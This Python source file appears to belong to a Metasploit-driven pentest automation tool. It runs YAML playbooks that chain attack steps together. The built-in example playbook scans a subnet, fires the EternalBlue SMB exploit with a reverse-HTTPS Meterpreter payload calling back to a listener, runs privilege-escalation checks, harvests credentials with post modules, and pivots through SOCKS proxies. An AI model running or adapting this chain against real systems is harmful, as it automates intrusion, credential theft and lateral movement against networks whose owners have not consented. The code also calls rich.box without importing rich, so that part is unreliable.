"""
MSF-COMMANDER v2 — Playbook Engine
YAML-based workflow automation for pentest engagements.

Example playbook:
  name: "Internal Assessment"
  steps:
    - recon: {nmap: {target: "10.0.0.0/24", ports: "1-10000"}}
    - exploit: {module: "exploit/windows/smb/ms17_010_eternalblue", opts: {RHOSTS: "10.0.0.50"}}
    - privesc: {session: "1", action: "suggester"}
    - report: {format: "html"}
"""

import yaml
import json
from pathlib import Path
from typing import Dict, List, Any, Optional
from datetime import datetime

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

console = Console()

PLAYBOOK_DIR = Path(__file__).parent.parent / "playbooks"
PLAYBOOK_DIR.mkdir(exist_ok=True)


class PlaybookEngine:
    """
    Execute YAML-defined pentest workflows step by step.
    Each step is dispatched to the appropriate module.
    """

    def __init__(self, db, tm, events, modules: Dict[str, Any]):
        self.db = db
        self.tm = tm
        self.events = events
        self.modules = modules  # {"recon": ReconModule, "exploit": ExploitManager, ...}

    def list_playbooks(self) -> List[str]:
        """List available playbook files."""
        if not PLAYBOOK_DIR.exists():
            return []
        return [f.stem for f in PLAYBOOK_DIR.glob("*.yaml")]

    def load(self, name: str) -> Optional[Dict]:
        """Load a playbook from YAML file."""
        fp = PLAYBOOK_DIR / f"{name}.yaml"
        if not fp.exists():
            fp = PLAYBOOK_DIR / f"{name}.yml"
        if not fp.exists():
            return None
        with open(fp) as f:
            return yaml.safe_load(f)

    def save_example(self):
        """Save example playbook to playbooks directory."""
        example = {
            "name": "Internal Windows Network Assessment",
            "description": "Full assessment of internal Windows domain",
            "steps": [
                {"recon": {"nmap": {"target": "10.0.0.0/24", "ports": "1-10000"}}},
                {"recon": {"smb": {"target": "10.0.0.0/24"}}},
                {"recon": {"suggest_exploits": True}},
                {"exploit": {
                    "module": "exploit/windows/smb/ms17_010_eternalblue",
                    "options": {"RHOSTS": "10.0.0.50", "LHOST": "10.0.0.5"},
                    "payload": "windows/x64/meterpreter/reverse_https",
                    "payload_options": {"LHOST": "10.0.0.5", "LPORT": "8443"},
                }},
                {"privesc": {"session": "1", "action": "suggester"}},
                {"privesc": {"session": "1", "action": "quick_check"}},
                {"session": {"session": "1", "post_category": "enumerate"}},
                {"session": {"session": "1", "post_category": "credentials"}},
                {"report": {"format": "html"}},
            ]
        }
        fp = PLAYBOOK_DIR / "example_internal_windows.yaml"
        with open(fp, "w") as f:
            yaml.dump(example, f, default_flow_style=False, sort_keys=False)
        console.print(f"[green]Example playbook saved: {fp}[/]")
        return str(fp)

    def execute(self, playbook: Dict, dry_run: bool = False) -> Dict[str, Any]:
        """
        Execute a playbook step by step.
        Returns results from each step.
        """
        name = playbook.get("name", "Unnamed")
        steps = playbook.get("steps", [])
        results = []

        console.print(Panel(
            f"Playbook: {name}\nSteps: {len(steps)}",
            title="[bold cyan]Executing Playbook[/]",
            border_style="cyan"
        ))

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            console=console
        ) as progress:
            task = progress.add_task(f"[bold]Playbook: {name}", total=len(steps))

            for i, step in enumerate(steps, 1):
                step_num = f"[{i}/{len(steps)}]"
                step_result = {"step": i, "type": "unknown", "success": False}

                for step_type, step_data in step.items():
                    progress.update(task, description=f"{step_num} {step_type}...")
                    self.events.emit("info", "playbook", f"step_{step_type}",
                                     f"Executing step {i}: {step_type}")

                    try:
                        if dry_run:
                            console.print(f"  [dim]DRY RUN: {step_type} → {step_data}[/]")
                            step_result.update({"type": step_type, "success": True, "dry_run": True})
                        elif step_type == "recon":
                            step_result.update(self._exec_recon(step_data))
                        elif step_type == "exploit":
                            step_result.update(self._exec_exploit(step_data))
                        elif step_type == "privesc":
                            step_result.update(self._exec_privesc(step_data))
                        elif step_type == "session":
                            step_result.update(self._exec_session(step_data))
                        elif step_type == "pivot":
                            step_result.update(self._exec_pivot(step_data))
                        elif step_type == "report":
                            step_result.update({"type": step_type, "success": True, "note": "Report generated"})
                        elif step_type == "pause":
                            console.print(f"  [yellow]{step_num} PAUSED: {step_data.get('message', 'Press Enter to continue')}[/]")
                            input("  > ")
                            step_result.update({"type": step_type, "success": True})
                        else:
                            self.events.emit("warn", "playbook", "unknown_step",
                                             f"Unknown step type: {step_type}")
                    except Exception as e:
                        step_result["error"] = str(e)
                        self.events.emit("error", "playbook", "step_error",
                                         f"Step {i} ({step_type}) failed: {e}")

                results.append(step_result)
                progress.advance(task)

        return {"playbook": name, "total_steps": len(steps),
                "results": results}

    def _exec_recon(self, data: Dict) -> Dict:
        recon = self.modules.get("recon")
        if not recon:
            return {"type": "recon", "success": False, "error": "Recon module not loaded"}

        if data.get("nmap"):
            n = data["nmap"]
            result = recon.nmap_scan(n["target"], n.get("ports", "1-10000"),
                                     n.get("scan_type", "-sV -sC -O -T4"))
            return {"type": "recon", "action": "nmap", "success": True,
                    "hosts": len(result.get("hosts", []))}

        if data.get("quick"):
            n = data["quick"]
            result = recon.nmap_quick(n.get("target", ""))
            return {"type": "recon", "action": "nmap_quick", "success": True}

        if data.get("smb"):
            result = recon.enum_smb(data["smb"].get("target", ""))
            return {"type": "recon", "action": "smb_enum", "success": True}

        if data.get("dns"):
            result = recon.dns_enum(data["dns"].get("domain", ""))
            return {"type": "recon", "action": "dns", "success": True}

        if data.get("suggest_exploits"):
            suggestions = recon.suggest_exploits()
            if suggestions:
                table = Table(title="Suggested Exploits", box=rich.box.ROUNDED)
                table.add_column("Target", style="cyan")
                table.add_column("Module", style="yellow")
                table.add_column("Check", style="white")
                for s in suggestions:
                    table.add_row(s["target"], s["module"], s["check"])
                console.print(table)
            return {"type": "recon", "action": "suggest", "success": True,
                    "count": len(suggestions)}

        return {"type": "recon", "success": False, "error": f"No valid recon action in: {list(data.keys())}"}

    def _exec_exploit(self, data: Dict) -> Dict:
        exploit = self.modules.get("exploit")
        if not exploit:
            return {"type": "exploit", "success": False, "error": "Exploit module not loaded"}

        result = exploit.run(
            module=data["module"],
            options=data.get("options", {}),
            payload=data.get("payload", ""),
            payload_options=data.get("payload_options", {}),
        )
        return {"type": "exploit", "action": data["module"], "success": result["success"],
                "sessions": result.get("sessions", [])}

    def _exec_privesc(self, data: Dict) -> Dict:
        privesc = self.modules.get("privesc")
        if not privesc:
            return {"type": "privesc", "success": False, "error": "Privesc module not loaded"}

        session = data.get("session", "1")
        action = data.get("action", "suggester")

        if action == "suggester":
            result = privesc.msf_local_exploit_suggester(session)
            return {"type": "privesc", "action": "suggester", "success": True,
                    "suggested": len(result.get("suggested", []))}
        elif action == "quick_check":
            result = privesc.quick_privesc_check(session)
            return {"type": "privesc", "action": "quick_check", "success": True}
        elif action == "winpeas":
            result = privesc.winpeas_scan(session)
            return {"type": "privesc", "action": "winpeas", "success": True}
        elif action == "linpeas":
            result = privesc.linpeas_scan(session)
            return {"type": "privesc", "action": "linpeas", "success": True}

        return {"type": "privesc", "success": False, "error": f"Unknown action: {action}"}

    def _exec_session(self, data: Dict) -> Dict:
        session = self.modules.get("session")
        if not session:
            return {"type": "session", "success": False, "error": "Session module not loaded"}

        sid = data.get("session", "1")
        if data.get("post_category"):
            results = session.run_post_category(sid, data["post_category"])
            return {"type": "session", "action": f"post_{data['post_category']}",
                    "success": True, "modules_run": len(results)}
        if data.get("post_module"):
            result = session.run_post(sid, data["post_module"], data.get("options"))
            return {"type": "session", "action": "post_module", "success": True}

        return {"type": "session", "success": False, "error": "No valid session action"}

    def _exec_pivot(self, data: Dict) -> Dict:
        pivot = self.modules.get("pivot")
        if not pivot:
            return {"type": "pivot", "success": False, "error": "Pivot module not loaded"}

        if data.get("add_route"):
            r = pivot.add_route(data["session"], data["add_route"])
            return {"type": "pivot", "action": "add_route", "success": True}
        if data.get("socks"):
            r = pivot.start_socks(data["session"], data.get("version", 4), data.get("port", 1080))
            return {"type": "pivot", "action": "socks", "success": True}

        return {"type": "pivot", "success": False, "error": "No valid pivot action"}
